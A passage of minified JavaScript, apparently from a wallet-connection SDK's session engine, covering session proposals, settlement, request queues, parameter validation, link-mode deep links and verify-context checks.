this.client.session.delete(i,ut("USER_DISCONNECTED")),this.addToRecentlyDeleted(i,"session"),this.client.core.crypto.keychain.has(u.publicKey)&&await this.client.core.crypto.deleteKeyPair(u.publicKey),this.client.core.crypto.keychain.has(i)&&await this.client.core.crypto.deleteSymKey(i),o||this.client.core.expirer.del(i),this.client.core.storage.removeItem(x2).catch(f=>this.client.logger.warn(f)),this.getPendingSessionRequests().forEach(f=>{f.topic===i&&this.deletePendingSessionRequest(f.id,ut("USER_DISCONNECTED"))}),i===((r=this.sessionRequestQueue.queue[0])==null?void 0:r.topic)&&(this.sessionRequestQueue.state=Kr.idle),l&&this.client.events.emit("session_delete",{id:c,topic:i})}),me(this,"deleteProposal",async(n,r)=>{if(r)try{const i=this.client.proposal.get(n),o=this.client.core.eventClient.getEvent({topic:i.pairingTopic});o==null||o.setError(js.proposal_expired)}catch{}await Promise.all([this.client.proposal.delete(n,ut("USER_DISCONNECTED")),r?Promise.resolve():this.client.core.expirer.del(n)]),this.addToRecentlyDeleted(n,"proposal")}),me(this,"deletePendingSessionRequest",async(n,r,i=!1)=>{await Promise.all([this.client.pendingRequest.delete(n,r),i?Promise.resolve():this.client.core.expirer.del(n)]),this.addToRecentlyDeleted(n,"request"),this.sessionRequestQueue.queue=this.sessionRequestQueue.queue.filter(o=>o.id!==n),i&&(this.sessionRequestQueue.state=Kr.idle,this.client.events.emit("session_request_expire",{id:n}))}),me(this,"deletePendingAuthRequest",async(n,r,i=!1)=>{await Promise.all([this.client.auth.requests.delete(n,r),i?Promise.resolve():this.client.core.expirer.del(n)])}),me(this,"setExpiry",async(n,r)=>{this.client.session.keys.includes(n)&&(this.client.core.expirer.set(n,r),await this.client.session.update(n,{expiry:r}))}),me(this,"setProposal",async(n,r)=>{this.client.core.expirer.set(n,Nt(Ft.wc_sessionPropose.req.ttl)),await this.client.proposal.set(n,r)}),me(this,"setAuthRequest",async(n,r)=>{const{request:i,pairingTopic:o,transportType:l=dt.relay}=r;this.client.core.expirer.set(n,i.expiryTimestamp),await this.client.auth.requests.set(n,{authPayload:i.authPayload,requester:i.requester,expiryTimestamp:i.expiryTimestamp,id:n,pairingTopic:o,verifyContext:i.verifyContext,transportType:l})}),me(this,"setPendingSessionRequest",async n=>{const{id:r,topic:i,params:o,verifyContext:l}=n,c=o.request.expiryTimestamp||Nt(Ft.wc_sessionRequest.req.ttl);this.client.core.expirer.set(r,c),await this.client.pendingRequest.set(r,{id:r,topic:i,params:o,verifyContext:l})}),me(this,"sendRequest",async n=>{const{topic:r,method:i,params:o,expiry:l,relayRpcId:c,clientRpcId:u,throwOnFailedPublish:f,appLink:d,tvf:y}=n,g=ys(i,o,u);let E;const w=!!d;try{const x=w?ps:kr;E=await this.client.core.crypto.encode(r,g,{encoding:x})}catch(x){throw await this.cleanup(),this.client.logger.error(`sendRequest() -> core.crypto.encode() for topic ${r} failed`),x}let b;if(FF.includes(i)){const x=Xr(JSON.stringify(g)),S=Xr(E);b=await this.client.core.verify.register({id:S,decryptedId:x})}const m=Ft[i].req;if(m.attestation=b,l&&(m.ttl=l),c&&(m.id=c),this.client.core.history.set(r,g),w){const x=Oh(d,r,E);await globalThis.Linking.openURL(x,this.client.name)}else{const x=Ft[i].req;l&&(x.ttl=l),c&&(x.id=c),x.tvf=bn(it({},y),{correlationId:g.id}),f?(x.internal=bn(it({},x.internal),{throwOnFailedPublish:!0}),await this.client.core.relayer.publish(r,E,x)):this.client.core.relayer.publish(r,E,x).catch(S=>this.client.logger.error(S))}return g.id}),me(this,"sendResult",async n=>{const{id:r,topic:i,result:o,throwOnFailedPublish:l,encodeOpts:c,appLink:u}=n,f=Lf(r,o);let d;const y=u&&typeof(globalThis==null?void 0:globalThis.Linking)<"u";try{const w=y?ps:kr;d=await this.client.core.crypto.encode(i,f,bn(it({},c||{}),{encoding:w}))}catch(w){throw await this.cleanup(),this.client.logger.error(`sendResult() -> core.crypto.encode() for topic ${i} failed`),w}let g,E;try{g=await this.client.core.history.get(i,r);const w=g.request;try{this.shouldSetTVF(w.method,w.params)&&(E=this.getTVFParams(r,w.params,o))}catch(b){this.client.logger.warn("sendResult() -> getTVFParams() failed",b)}}catch(w){throw this.client.logger.error(`sendResult() -> history.get(${i}, ${r}) failed`),w}if(y){const w=Oh(u,i,d);await globalThis.Linking.openURL(w,this.client.name)}else{const w=g.request.method,b=Ft[w].res;b.tvf=bn(it({},E),{correlationId:r}),l?(b.internal=bn(it({},b.internal),{throwOnFailedPublish:!0}),await this.client.core.relayer.publish(i,d,b)):this.client.core.relayer.publish(i,d,b).catch(m=>this.client.logger.error(m))}await this.client.core.history.resolve(f)}),me(this,"sendError",async n=>{const{id:r,topic:i,error:o,encodeOpts:l,rpcOpts:c,appLink:u}=n,f=jf(r,o);let d;const y=u&&typeof(globalThis==null?void 0:globalThis.Linking)<"u";try{const E=y?ps:kr;d=await this.client.core.crypto.encode(i,f,bn(it({},l||{}),{encoding:E}))}catch(E){throw await this.cleanup(),this.client.logger.error(`sendError() -> core.crypto.encode() for topic ${i} failed`),E}let g;try{g=await this.client.core.history.get(i,r)}catch(E){throw this.client.logger.error(`sendError() -> history.get(${i}, ${r}) failed`),E}if(y){const E=Oh(u,i,d);await globalThis.Linking.openURL(E,this.client.name)}else{const E=g.request.method,w=c||Ft[E].res;this.client.core.relayer.publish(i,d,w)}await this.client.core.history.resolve(f)}),me(this,"cleanup",async()=>{const n=[],r=[];this.client.session.getAll().forEach(i=>{let o=!1;fs(i.expiry)&&(o=!0),this.client.core.crypto.keychain.has(i.topic)||(o=!0),o&&n.push(i.topic)}),this.client.proposal.getAll().forEach(i=>{fs(i.expiryTimestamp)&&r.push(i.id)}),await Promise.all([...n.map(i=>this.deleteSession({topic:i})),...r.map(i=>this.deleteProposal(i))])}),me(this,"onProviderMessageEvent",async n=>{!this.initialized||this.relayMessageCache.length>0?this.relayMessageCache.push(n):await this.onRelayMessage(n)}),me(this,"onRelayEventRequest",async n=>{this.requestQueue.queue.push(n),await this.processRequestsQueue()}),me(this,"processRequestsQueue",async()=>{if(this.requestQueue.state===Kr.active){this.client.logger.info("Request queue already active, skipping...");return}for(this.client.logger.info(`Request queue starting with ${this.requestQueue.queue.length} requests`);this.requestQueue.queue.length>0;){this.requestQueue.state=Kr.active;const n=this.requestQueue.queue.shift();if(n)try{await this.processRequest(n)}catch(r){this.client.logger.warn(r)}}this.requestQueue.state=Kr.idle}),me(this,"processRequest",async n=>{const{topic:r,payload:i,attestation:o,transportType:l,encryptedId:c}=n,u=i.method;if(!this.shouldIgnorePairingRequest({topic:r,requestMethod:u}))switch(u){case"wc_sessionPropose":return await this.onSessionProposeRequest({topic:r,payload:i,attestation:o,encryptedId:c});case"wc_sessionSettle":return await this.onSessionSettleRequest(r,i);case"wc_sessionUpdate":return await this.onSessionUpdateRequest(r,i);case"wc_sessionExtend":return await this.onSessionExtendRequest(r,i);case"wc_sessionPing":return await this.onSessionPingRequest(r,i);case"wc_sessionDelete":return await this.onSessionDeleteRequest(r,i);case"wc_sessionRequest":return await this.onSessionRequest({topic:r,payload:i,attestation:o,encryptedId:c,transportType:l});case"wc_sessionEvent":return await this.onSessionEventRequest(r,i);case"wc_sessionAuthenticate":return await this.onSessionAuthenticateRequest({topic:r,payload:i,attestation:o,encryptedId:c,transportType:l});default:return this.client.logger.info(`Unsupported request method ${u}`)}}),me(this,"onRelayEventResponse",async n=>{const{topic:r,payload:i,transportType:o}=n,l=(await this.client.core.history.get(r,i.id)).request.method;switch(l){case"wc_sessionPropose":return this.onSessionProposeResponse(r,i,o);case"wc_sessionSettle":return this.onSessionSettleResponse(r,i);case"wc_sessionUpdate":return this.onSessionUpdateResponse(r,i);case"wc_sessionExtend":return this.onSessionExtendResponse(r,i);case"wc_sessionPing":return this.onSessionPingResponse(r,i);case"wc_sessionRequest":return this.onSessionRequestResponse(r,i);case"wc_sessionAuthenticate":return this.onSessionAuthenticateResponse(r,i);default:return this.client.logger.info(`Unsupported response method ${l}`)}}),me(this,"onRelayEventUnknownPayload",n=>{const{topic:r}=n,{message:i}=Ee("MISSING_OR_INVALID",`Decoded payload on topic ${r} is not identifiable as a JSON-RPC request or a response.`);throw new Error(i)}),me(this,"shouldIgnorePairingRequest",n=>{const{topic:r,requestMethod:i}=n,o=this.expectedPairingMethodMap.get(r);return!o||o.includes(i)?!1:!!(o.includes("wc_sessionAuthenticate")&&this.client.events.listenerCount("session_authenticate")>0)}),me(this,"onSessionProposeRequest",async n=>{const{topic:r,payload:i,attestation:o,encryptedId:l}=n,{params:c,id:u}=i;try{const f=this.client.core.eventClient.getEvent({topic:r});this.client.events.listenerCount("session_proposal")===0&&(console.warn("No listener for session_proposal event"),f==null||f.setError(Ei.proposal_listener_not_found)),this.isValidConnect(it({},i.params));const d=c.expiryTimestamp||Nt(Ft.wc_sessionPropose.req.ttl),y=it({id:u,pairingTopic:r,expiryTimestamp:d},c);await this.setProposal(u,y);const g=await this.getVerifyContext({attestationId:o,hash:Xr(JSON.stringify(i)),encryptedId:l,metadata:y.proposer.metadata});f==null||f.addTrace(Jr.emit_session_proposal),this.client.events.emit("session_proposal",{id:u,params:y,verifyContext:g})}catch(f){await this.sendError({id:u,topic:r,error:f,rpcOpts:Ft.wc_sessionPropose.autoReject}),this.client.logger.error(f)}}),me(this,"onSessionProposeResponse",async(n,r,i)=>{const{id:o}=r;if(Qr(r)){const{result:l}=r;this.client.logger.trace({type:"method",method:"onSessionProposeResponse",result:l});const c=this.client.proposal.get(o);this.client.logger.trace({type:"method",method:"onSessionProposeResponse",proposal:c});const u=c.proposer.publicKey;this.client.logger.trace({type:"method",method:"onSessionProposeResponse",selfPublicKey:u});const f=l.responderPublicKey;this.client.logger.trace({type:"method",method:"onSessionProposeResponse",peerPublicKey:f});const d=await this.client.core.crypto.generateSharedKey(u,f);this.pendingSessions.set(o,{sessionTopic:d,pairingTopic:n,proposalId:o,publicKey:u});const y=await this.client.core.relayer.subscribe(d,{transportType:i});this.client.logger.trace({type:"method",method:"onSessionProposeResponse",subscriptionId:y}),await this.client.core.pairing.activate({topic:n})}else if(dr(r)){await this.client.proposal.delete(o,ut("USER_DISCONNECTED"));const l=Je("session_connect",o);if(this.events.listenerCount(l)===0)throw new Error(`emitting ${l} without any listeners, 954`);this.events.emit(l,{error:r.error})}}),me(this,"onSessionSettleRequest",async(n,r)=>{const{id:i,params:o}=r;try{this.isValidSessionSettleRequest(o);const{relay:l,controller:c,expiry:u,namespaces:f,sessionProperties:d,scopedProperties:y,sessionConfig:g}=r.params,E=[...this.pendingSessions.values()].find(m=>m.sessionTopic===n);if(!E)return this.client.logger.error(`Pending session not found for topic ${n}`);const w=this.client.proposal.get(E.proposalId),b=bn(it(it(it({topic:n,relay:l,expiry:u,namespaces:f,acknowledged:!0,pairingTopic:E.pairingTopic,requiredNamespaces:w.requiredNamespaces,optionalNamespaces:w.optionalNamespaces,controller:c.publicKey,self:{publicKey:E.publicKey,metadata:this.client.metadata},peer:{publicKey:c.publicKey,metadata:c.metadata}},d&&{sessionProperties:d}),y&&{scopedProperties:y}),g&&{sessionConfig:g}),{transportType:dt.relay});await this.client.session.set(b.topic,b),await this.setExpiry(b.topic,b.expiry),await this.client.core.pairing.updateMetadata({topic:E.pairingTopic,metadata:b.peer.metadata}),this.client.events.emit("session_connect",{session:b}),this.events.emit(Je("session_connect",E.proposalId),{session:b}),this.pendingSessions.delete(E.proposalId),this.deleteProposal(E.proposalId,!1),this.cleanupDuplicatePairings(b),await this.sendResult({id:r.id,topic:n,result:!0,throwOnFailedPublish:!0})}catch(l){await this.sendError({id:i,topic:n,error:l}),this.client.logger.error(l)}}),me(this,"onSessionSettleResponse",async(n,r)=>{const{id:i}=r;Qr(r)?(await this.client.session.update(n,{acknowledged:!0}),this.events.emit(Je("session_approve",i),{})):dr(r)&&(await this.client.session.delete(n,ut("USER_DISCONNECTED")),this.events.emit(Je("session_approve",i),{error:r.error}))}),me(this,"onSessionUpdateRequest",async(n,r)=>{const{params:i,id:o}=r;try{const l=`${n}_session_update`,c=Xl.get(l);if(c&&this.isRequestOutOfSync(c,o)){this.client.logger.warn(`Discarding out of sync request - ${o}`),this.sendError({id:o,topic:n,error:ut("INVALID_UPDATE_REQUEST")});return}this.isValidUpdate(it({topic:n},i));try{Xl.set(l,o),await this.client.session.update(n,{namespaces:i.namespaces}),await this.sendResult({id:o,topic:n,result:!0,throwOnFailedPublish:!0})}catch(u){throw Xl.delete(l),u}this.client.events.emit("session_update",{id:o,topic:n,params:i})}catch(l){await this.sendError({id:o,topic:n,error:l}),this.client.logger.error(l)}}),me(this,"isRequestOutOfSync",(n,r)=>r.toString().slice(0,-3)<n.toString().slice(0,-3)),me(this,"onSessionUpdateResponse",(n,r)=>{const{id:i}=r,o=Je("session_update",i);if(this.events.listenerCount(o)===0)throw new Error(`emitting ${o} without any listeners`);Qr(r)?this.events.emit(Je("session_update",i),{}):dr(r)&&this.events.emit(Je("session_update",i),{error:r.error})}),me(this,"onSessionExtendRequest",async(n,r)=>{const{id:i}=r;try{this.isValidExtend({topic:n}),await this.setExpiry(n,Nt(Zo)),await this.sendResult({id:i,topic:n,result:!0,throwOnFailedPublish:!0}),this.client.events.emit("session_extend",{id:i,topic:n})}catch(o){await this.sendError({id:i,topic:n,error:o}),this.client.logger.error(o)}}),me(this,"onSessionExtendResponse",(n,r)=>{const{id:i}=r,o=Je("session_extend",i);if(this.events.listenerCount(o)===0)throw new Error(`emitting ${o} without any listeners`);Qr(r)?this.events.emit(Je("session_extend",i),{}):dr(r)&&this.events.emit(Je("session_extend",i),{error:r.error})}),me(this,"onSessionPingRequest",async(n,r)=>{const{id:i}=r;try{this.isValidPing({topic:n}),await this.sendResult({id:i,topic:n,result:!0,throwOnFailedPublish:!0}),this.client.events.emit("session_ping",{id:i,topic:n})}catch(o){await this.sendError({id:i,topic:n,error:o}),this.client.logger.error(o)}}),me(this,"onSessionPingResponse",(n,r)=>{const{id:i}=r,o=Je("session_ping",i);setTimeout(()=>{if(this.events.listenerCount(o)===0)throw new Error(`emitting ${o} without any listeners 2176`);Qr(r)?this.events.emit(Je("session_ping",i),{}):dr(r)&&this.events.emit(Je("session_ping",i),{error:r.error})},500)}),me(this,"onSessionDeleteRequest",async(n,r)=>{const{id:i}=r;try{this.isValidDisconnect({topic:n,reason:r.params}),Promise.all([new Promise(o=>{this.client.core.relayer.once(Wt.publish,async()=>{o(await this.deleteSession({topic:n,id:i}))})}),this.sendResult({id:i,topic:n,result:!0,throwOnFailedPublish:!0}),this.cleanupPendingSentRequestsForTopic({topic:n,error:ut("USER_DISCONNECTED")})]).catch(o=>this.client.logger.error(o))}catch(o){this.client.logger.error(o)}}),me(this,"onSessionRequest",async n=>{var r,i,o;const{topic:l,payload:c,attestation:u,encryptedId:f,transportType:d}=n,{id:y,params:g}=c;try{await this.isValidRequest(it({topic:l},g));const E=this.client.session.get(l),w=await this.getVerifyContext({attestationId:u,hash:Xr(JSON.stringify(ys("wc_sessionRequest",g,y))),encryptedId:f,metadata:E.peer.metadata,transportType:d}),b={id:y,topic:l,params:g,verifyContext:w};await this.setPendingSessionRequest(b),d===dt.link_mode&&(r=E.peer.metadata.redirect)!=null&&r.universal&&this.client.core.addLinkModeSupportedApp((i=E.peer.metadata.redirect)==null?void 0:i.universal),(o=this.client.signConfig)!=null&&o.disableRequestQueue?this.emitSessionRequest(b):(this.addSessionRequestToSessionRequestQueue(b),this.processSessionRequestQueue())}catch(E){await this.sendError({id:y,topic:l,error:E}),this.client.logger.error(E)}}),me(this,"onSessionRequestResponse",(n,r)=>{const{id:i}=r,o=Je("session_request",i);if(this.events.listenerCount(o)===0)throw new Error(`emitting ${o} without any listeners`);Qr(r)?this.events.emit(Je("session_request",i),{result:r.result}):dr(r)&&this.events.emit(Je("session_request",i),{error:r.error})}),me(this,"onSessionEventRequest",async(n,r)=>{const{id:i,params:o}=r;try{const l=`${n}_session_event_${o.event.name}`,c=Xl.get(l);if(c&&this.isRequestOutOfSync(c,i)){this.client.logger.info(`Discarding out of sync request - ${i}`);return}this.isValidEmit(it({topic:n},o)),this.client.events.emit("session_event",{id:i,topic:n,params:o}),Xl.set(l,i)}catch(l){await this.sendError({id:i,topic:n,error:l}),this.client.logger.error(l)}}),me(this,"onSessionAuthenticateResponse",(n,r)=>{const{id:i}=r;this.client.logger.trace({type:"method",method:"onSessionAuthenticateResponse",topic:n,payload:r}),Qr(r)?this.events.emit(Je("session_request",i),{result:r.result}):dr(r)&&this.events.emit(Je("session_request",i),{error:r.error})}),me(this,"onSessionAuthenticateRequest",async n=>{var r;const{topic:i,payload:o,attestation:l,encryptedId:c,transportType:u}=n;try{const{requester:f,authPayload:d,expiryTimestamp:y}=o.params,g=await this.getVerifyContext({attestationId:l,hash:Xr(JSON.stringify(o)),encryptedId:c,metadata:f.metadata,transportType:u}),E={requester:f,pairingTopic:i,id:o.id,authPayload:d,verifyContext:g,expiryTimestamp:y};await this.setAuthRequest(o.id,{request:E,pairingTopic:i,transportType:u}),u===dt.link_mode&&(r=f.metadata.redirect)!=null&&r.universal&&this.client.core.addLinkModeSupportedApp(f.metadata.redirect.universal),this.client.events.emit("session_authenticate",{topic:i,params:o.params,id:o.id,verifyContext:g})}catch(f){this.client.logger.error(f);const d=o.params.requester.publicKey,y=await this.client.core.crypto.generateKeyPair(),g=this.getAppLinkIfEnabled(o.params.requester.metadata,u),E={type:Ri,receiverPublicKey:d,senderPublicKey:y};await this.sendError({id:o.id,topic:i,error:f,encodeOpts:E,rpcOpts:Ft.wc_sessionAuthenticate.autoReject,appLink:g})}}),me(this,"addSessionRequestToSessionRequestQueue",n=>{this.sessionRequestQueue.queue.push(n)}),me(this,"cleanupAfterResponse",n=>{this.deletePendingSessionRequest(n.response.id,{message:"fulfilled",code:0}),setTimeout(()=>{this.sessionRequestQueue.state=Kr.idle,this.processSessionRequestQueue()},be.toMiliseconds(this.requestQueueDelay))}),me(this,"cleanupPendingSentRequestsForTopic",({topic:n,error:r})=>{const i=this.client.core.history.pending;i.length>0&&i.filter(o=>o.topic===n&&o.request.method==="wc_sessionRequest").forEach(o=>{const l=o.request.id,c=Je("session_request",l);if(this.events.listenerCount(c)===0)throw new Error(`emitting ${c} without any listeners`);this.events.emit(Je("session_request",o.request.id),{error:r})})}),me(this,"processSessionRequestQueue",()=>{if(this.sessionRequestQueue.state===Kr.active){this.client.logger.info("session request queue is already active.");return}const n=this.sessionRequestQueue.queue[0];if(!n){this.client.logger.info("session request queue is empty.");return}try{this.sessionRequestQueue.state=Kr.active,this.emitSessionRequest(n)}catch(r){this.client.logger.error(r)}}),me(this,"emitSessionRequest",n=>{this.client.events.emit("session_request",n)}),me(this,"onPairingCreated",n=>{if(n.methods&&this.expectedPairingMethodMap.set(n.topic,n.methods),n.active)return;const r=this.client.proposal.getAll().find(i=>i.pairingTopic===n.topic);r&&this.onSessionProposeRequest({topic:n.topic,payload:ys("wc_sessionPropose",bn(it({},r),{requiredNamespaces:r.requiredNamespaces,optionalNamespaces:r.optionalNamespaces,relays:r.relays,proposer:r.proposer,sessionProperties:r.sessionProperties,scopedProperties:r.scopedProperties}),r.id)})}),me(this,"isValidConnect",async n=>{if(!Nn(n)){const{message:f}=Ee("MISSING_OR_INVALID",`connect() params: ${JSON.stringify(n)}`);throw new Error(f)}const{pairingTopic:r,requiredNamespaces:i,optionalNamespaces:o,sessionProperties:l,scopedProperties:c,relays:u}=n;if(an(r)||await this.isValidPairingTopic(r),!zj(u)){const{message:f}=Ee("MISSING_OR_INVALID",`connect() relays: ${u}`);throw new Error(f)}if(!an(i)&&cf(i)!==0&&this.validateNamespaces(i,"requiredNamespaces"),!an(o)&&cf(o)!==0&&this.validateNamespaces(o,"optionalNamespaces"),an(l)||this.validateSessionProps(l,"sessionProperties"),!an(c)){this.validateSessionProps(c,"scopedProperties");const f=Object.keys(i||{}).concat(Object.keys(o||{}));if(!Object.keys(c).every(d=>f.includes(d)))throw new Error(`Scoped properties must be a subset of required/optional namespaces, received: ${JSON.stringify(c)}, required/optional namespaces: ${JSON.stringify(f)}`)}}),me(this,"validateNamespaces",(n,r)=>{const i=Fj(n,"connect()",r);if(i)throw new Error(i.message)}),me(this,"isValidApprove",async n=>{if(!Nn(n))throw new Error(Ee("MISSING_OR_INVALID",`approve() params: ${n}`).message);const{id:r,namespaces:i,relayProtocol:o,sessionProperties:l,scopedProperties:c}=n;this.checkRecentlyDeleted(r),await this.isValidProposalId(r);const u=this.client.proposal.get(r),f=Lg(i,"approve()");if(f)throw new Error(f.message);const d=FE(u.requiredNamespaces,i,"approve()");if(d)throw new Error(d.message);if(!At(o,!0)){const{message:y}=Ee("MISSING_OR_INVALID",`approve() relayProtocol: ${o}`);throw new Error(y)}if(an(l)||this.validateSessionProps(l,"sessionProperties"),!an(c)){this.validateSessionProps(c,"scopedProperties");const y=new Set(Object.keys(i));if(!Object.keys(c).every(g=>y.has(g)))throw new Error(`Scoped properties must be a subset of approved namespaces, received: ${JSON.stringify(c)}, approved namespaces: ${Array.from(y).join(", ")}`)}}),me(this,"isValidReject",async n=>{if(!Nn(n)){const{message:o}=Ee("MISSING_OR_INVALID",`reject() params: ${n}`);throw new Error(o)}const{id:r,reason:i}=n;if(this.checkRecentlyDeleted(r),await this.isValidProposalId(r),!Hj(i)){const{message:o}=Ee("MISSING_OR_INVALID",`reject() reason: ${JSON.stringify(i)}`);throw new Error(o)}}),me(this,"isValidSessionSettleRequest",n=>{if(!Nn(n)){const{message:f}=Ee("MISSING_OR_INVALID",`onSessionSettleRequest() params: ${n}`);throw new Error(f)}const{relay:r,controller:i,namespaces:o,expiry:l}=n;if(!dI(r)){const{message:f}=Ee("MISSING_OR_INVALID","onSessionSettleRequest() relay protocol should be a string");throw new Error(f)}const c=kj(i,"onSessionSettleRequest()");if(c)throw new Error(c.message);const u=Lg(o,"onSessionSettleRequest()");if(u)throw new Error(u.message);if(fs(l)){const{message:f}=Ee("EXPIRED","onSessionSettleRequest()");throw new Error(f)}}),me(this,"isValidUpdate",async n=>{if(!Nn(n)){const{message:u}=Ee("MISSING_OR_INVALID",`update() params: ${n}`);throw new Error(u)}const{topic:r,namespaces:i}=n;this.checkRecentlyDeleted(r),await this.isValidSessionTopic(r);const o=this.client.session.get(r),l=Lg(i,"update()");if(l)throw new Error(l.message);const c=FE(o.requiredNamespaces,i,"update()");if(c)throw new Error(c.message)}),me(this,"isValidExtend",async n=>{if(!Nn(n)){const{message:i}=Ee("MISSING_OR_INVALID",`extend() params: ${n}`);throw new Error(i)}const{topic:r}=n;this.checkRecentlyDeleted(r),await this.isValidSessionTopic(r)}),me(this,"isValidRequest",async n=>{if(!Nn(n)){const{message:u}=Ee("MISSING_OR_INVALID",`request() params: ${n}`);throw new Error(u)}const{topic:r,request:i,chainId:o,expiry:l}=n;this.checkRecentlyDeleted(r),await this.isValidSessionTopic(r);const{namespaces:c}=this.client.session.get(r);if(!ME(c,o)){const{message:u}=Ee("MISSING_OR_INVALID",`request() chainId: ${o}`);throw new Error(u)}if(!Vj(i)){const{message:u}=Ee("MISSING_OR_INVALID",`request() ${JSON.stringify(i)}`);throw new Error(u)}if(!Gj(c,o,i.method)){const{message:u}=Ee("MISSING_OR_INVALID",`request() method: ${i.method}`);throw new Error(u)}if(l&&!Qj(l,Vg)){const{message:u}=Ee("MISSING_OR_INVALID",`request() expiry: ${l}. Expiry must be a number (in seconds) between ${Vg.min} and ${Vg.max}`);throw new Error(u)}}),me(this,"isValidRespond",async n=>{var r;if(!Nn(n)){const{message:l}=Ee("MISSING_OR_INVALID",`respond() params: ${n}`);throw new Error(l)}const{topic:i,response:o}=n;try{await this.isValidSessionTopic(i)}catch(l){throw(r=n==null?void 0:n.response)!=null&&r.id&&this.cleanupAfterResponse(n),l}if(!Wj(o)){const{message:l}=Ee("MISSING_OR_INVALID",`respond() response: ${JSON.stringify(o)}`);throw new Error(l)}}),me(this,"isValidPing",async n=>{if(!Nn(n)){const{message:i}=Ee("MISSING_OR_INVALID",`ping() params: ${n}`);throw new Error(i)}const{topic:r}=n;await this.isValidSessionOrPairingTopic(r)}),me(this,"isValidEmit",async n=>{if(!Nn(n)){const{message:c}=Ee("MISSING_OR_INVALID",`emit() params: ${n}`);throw new Error(c)}const{topic:r,event:i,chainId:o}=n;await this.isValidSessionTopic(r);const{namespaces:l}=this.client.session.get(r);if(!ME(l,o)){const{message:c}=Ee("MISSING_OR_INVALID",`emit() chainId: ${o}`);throw new Error(c)}if(!Kj(i)){const{message:c}=Ee("MISSING_OR_INVALID",`emit() event: ${JSON.stringify(i)}`);throw new Error(c)}if(!Yj(l,o,i.name)){const{message:c}=Ee("MISSING_OR_INVALID",`emit() event: ${JSON.stringify(i)}`);throw new Error(c)}}),me(this,"isValidDisconnect",async n=>{if(!Nn(n)){const{message:i}=Ee("MISSING_OR_INVALID",`disconnect() params: ${n}`);throw new Error(i)}const{topic:r}=n;await this.isValidSessionOrPairingTopic(r)}),me(this,"isValidAuthenticate",n=>{const{chains:r,uri:i,domain:o,nonce:l}=n;if(!Array.isArray(r)||r.length===0)throw new Error("chains is required and must be a non-empty array");if(!At(i,!1))throw new Error("uri is required parameter");if(!At(o,!1))throw new Error("domain is required parameter");if(!At(l,!1))throw new Error("nonce is required parameter");if([...new Set(r.map(u=>zh(u).namespace))].length>1)throw new Error("Multi-namespace requests are not supported. Please request single namespace only.");const{namespace:c}=zh(r[0]);if(c!=="eip155")throw new Error("Only eip155 namespace is supported for authenticated sessions. Please use .connect() for non-eip155 chains.")}),me(this,"getVerifyContext",async n=>{const{attestationId:r,hash:i,encryptedId:o,metadata:l,transportType:c}=n,u={verified:{verifyUrl:l.verifyUrl||gc,validation:"UNKNOWN",origin:l.url||""}};try{if(c===dt.link_mode){const d=this.getAppLinkIfEnabled(l,c);return u.verified.validation=d&&new URL(d).origin===new URL(l.url).origin?"VALID":"INVALID",u}const f=await this.client.core.verify.resolve({attestationId:r,hash:i,encryptedId:o,verifyUrl:l.verifyUrl});f&&(u.verified.origin=f.origin,u.verified.isScam=f.isScam,u.verified.validation=f.origin===new URL(l.url).origin?"VALID":"INVALID")}catch(f){this.client.logger.warn(f)}return this.client.logger.debug(`Verify context: ${JSON.stringify(u)}`),u}),me(this,"validateSessionProps",(n,r)=>{Object.values(n).forEach((i,o)=>{if(i==null){const{message:l}=Ee("MISSING_OR_INVALID",`${r} must contain an existing value for each key. Received: ${i} for key ${Object.keys(n)[o]}`);throw new Error(l)}})}),me(this,"getPendingAuthRequest",n=>{const r=this.client.auth.requests.get(n);return typeof r=="object"?r:void 0}),me(this,"addToRecentlyDeleted",(n,r)=>{if(this.recentlyDeletedMap.set(n,r),this.recentlyDeletedMap.size>=this.recentlyDeletedLimit){let i=0;const o=this.recentlyDeletedLimit/2;for(const l of this.recentlyDeletedMap.keys()){if(i++>=o)break;this.recentlyDeletedMap.delete(l)}}}),me(this,"checkRecentlyDeleted",n=>{const r=this.recentlyDeletedMap.get(n);if(r){const{message:i}=Ee("MISSING_OR_INVALID",`Record was recently deleted - ${r}: ${n}`);throw new Error(i)}}),me(this,"isLinkModeEnabled",(n,r)=>{var i,o,l,c,u,f,d,y,g;return!n||r!==dt.link_mode?!1:((o=(i=this.client.metadata)==null?void 0:i.redirect)==null?void 0:o.linkMode)===!0&&((c=(l=this.client.metadata)==null?void 0:l.redirect)==null?void 0:c.universal)!==void 0&&((f=(u=this.client.metadata)==null?void 0:u.redirect)==null?void 0:f.universal)!==""&&((d=n==null?void 0:n.redirect)==null?void 0:d.universal)!==void 0&&((y=n==null?void 0:n.redirect)==null?void 0:y.universal)!==""&&((g=n==null?void 0:n.redirect)==null?void 0:g.linkMode)===!0&&this.client.core.linkModeSupportedApps.includes(n.redirect.universal)&&typeof(globalThis==null?void 0:globalThis.Linking)<"u"}),me(this,"getAppLinkIfEnabled",(n,r)=>{var i;return this.isLinkModeEnabled(n,r)?(i=n==null?void 0:n.redirect)==null?void 0:i.universal:void 0}),me(this,"handleLinkModeMessage",({url:n})=>{if(!n||!n.includes("wc_ev")||!n.includes("topic"))return;const r=sE(n,"topic")||"",i=decodeURIComponent(sE(n,"wc_ev")||""),o=this.client.session.keys.includes(r);o&&this.client.session.update(r,{transportType:dt.link_mode}),this.client.core.dispatchEnvelope({topic:r,message:i,sessionExists:o})}),me(this,"registerLinkModeListeners",async()=>{var n;if(ew()||bs()&&(n=this.client.metadata.redirect)!=null&&n.linkMode){const r=globalThis==null?void 0:globalThis.Linking;if(typeof r<"u"){r.addEventListener("url",this.handleLinkModeMessage,this.client.name);const i=await r.getInitialURL();i&&setTimeout(()=>{this.handleLinkModeMessage({url:i})},50)}}}),me(this,"shouldSetTVF",(n,r)=>{if(!r||n!=="wc_sessionRequest")return!1;const{request:i}=r;return Object.keys(_2).includes(i.method)}),me(this,"getTVFParams",(n,r,i)=>{var o,l;try{const c=r.request.method,u=this.extractTxHashesFromResult(c,i);return bn(it({correlationId:n,rpcMethods:[c],chainId:r.chainId},this.isValidContractData(r.request.params)&&{contractAddresses:[(l=(o=r.request.params)==null?void 0:o[0])==null?void 0:l.to]}),{txHashes:u})}catch(c){this.client.logger.warn("Error getting TVF params",c)}return{}}),me(this,"isValidContractData",n=>{var r;if(!n)return!1;try{const i=(n==null?void 0:n.data)||((r=n==null?void 0:n[0])==null?void 0:r.data);if(!i.startsWith("0x"))return!1;const o=i.slice(2);return/^[0-9a-fA-F]*$/.test(o)?o.length%2===0:!1}catch{}return!1}),me(this,"extractTxHashesFromResult",(n,r)=>{try{const i=_2[n];if(typeof r=="string")return[r];const o=r[i.key];if(Kc(o))return n==="solana_signAllTransactions"?o.map(l=>O5(l)):o;if(typeof 